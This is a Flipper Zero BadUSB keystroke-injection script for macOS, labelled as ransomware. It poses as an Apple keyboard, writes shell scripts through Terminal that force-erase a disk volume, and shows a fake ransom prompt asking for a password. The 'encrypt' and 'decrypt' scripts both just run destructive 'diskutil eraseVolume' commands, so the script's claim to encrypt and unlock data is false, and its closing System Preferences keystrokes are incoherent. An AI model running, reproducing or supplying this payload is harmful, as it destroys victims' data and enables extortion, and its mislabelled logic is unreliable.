REM Author: 47LeCoste
REM Version 1.0 (Flipper Ducky)
REM Target: macOS
ID 05ac:021e Apple:Keyboard
DELAY 1000
GUI SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING mkdir ~/Desktop/ransomware
DELAY 500
ENTER
DELAY 500
STRING cd ~/Desktop/ransomware
DELAY 500
ENTER
DELAY 500
STRING nano encrypt.sh
DELAY 500
ENTER
DELAY 500
STRING #!/bin/bash
DELAY 500
ENTER
DELAY 500
STRING for file in /Volumes/Macintosh\ HD/*
DELAY 500
ENTER
DELAY 500
STRING do
DELAY 500
ENTER
DELAY 500
STRING hdiutil attach -stdinpass "$file" -quiet
DELAY 500
ENTER
DELAY 500
STRING diskutil eraseVolume "JHFS+" "Encrypted" -force /dev/disk2
DELAY 500
ENTER
DELAY 500
STRING done &
DELAY 500
ENTER
DELAY 500
STRING osascript -e 'tell app "System Events" to display dialog "You got hacked. Insert the password to unlock your HD." default answer "" with icon caution with title "Ransomware" with text buttons {"Cancel", "OK"} default button "OK" giving up after 60' >/dev/null 2>&1
DELAY 500
ENTER
DELAY 500
CTRL X
DELAY 500
Y
DELAY 500
ENTER
DELAY 500
STRING nano decrypt.sh
DELAY 500
ENTER
DELAY 500
STRING #!/bin/bash
DELAY 500
ENTER
DELAY 500
STRING diskutil eraseVolume "JHFS+" "Macintosh HD" -force /dev/disk2 &
DELAY 500
ENTER
DELAY 500
CTRL X
DELAY 500
Y
DELAY 500
ENTER
DELAY 500
STRING chmod +x encrypt.sh decrypt.sh
DELAY 500
ENTER
DELAY 500
STRING screen -d -m -S encrypt ./encrypt.sh
DELAY 500
ENTER
DELAY 500
GUI SPACE
DELAY 500
STRING "System Preferences"
DELAY 500
ENTER
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
DOWNARROW
DELAY 500
DOWNARROW
DELAY 500
TAB
DELAY 500
SPACE
DELAY 500
TAB
DELAY 500
SPACE
DELAY 500
TAB
DELAY 500
STRING screen -d -m -S decrypt ./decrypt.sh
DELAY 500
ENTER
